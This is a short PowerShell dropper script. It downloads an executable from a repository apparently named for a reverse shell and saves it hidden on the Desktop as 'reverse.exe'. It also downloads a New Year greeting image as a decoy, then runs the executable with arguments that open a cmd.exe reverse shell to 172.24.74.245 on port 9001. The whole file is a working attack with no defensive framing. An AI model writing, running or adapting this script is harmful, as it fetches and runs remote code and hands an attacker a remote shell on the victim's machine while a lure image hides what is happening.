#Define the URL and the output path
$url = "https://raw.githubusercontent.com/NigelOmondi/powershell-revshell/refs/heads/main/powerev.ps1"
$desktopPath =  [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$filename = "reverse.exe"
$finalPath = Join-Path -Path $desktopPath -ChildPath $filename

$url2 = "https://img.freepik.com/free-vector/2025-new-year-greeting-background-with-grungy-effect_1017-56457.jpg?t=st=1734950382~exp=1734953982~hmac=4a91f6760a056e99595c65bddf84182bf94cea1bc5edae2bd04104ae9d7cc3c3&w=740"
$filename2 = "happynewyear.png"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

#Download the file
Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

#Define the parameters for the executable
$params = "-d 172.24.74.245 9001 -e cmd.exe" 

#Execute the file with parameters
Start-Process -FilePath $finalPath -ArgumentList $params
Start-Process $finalPath2

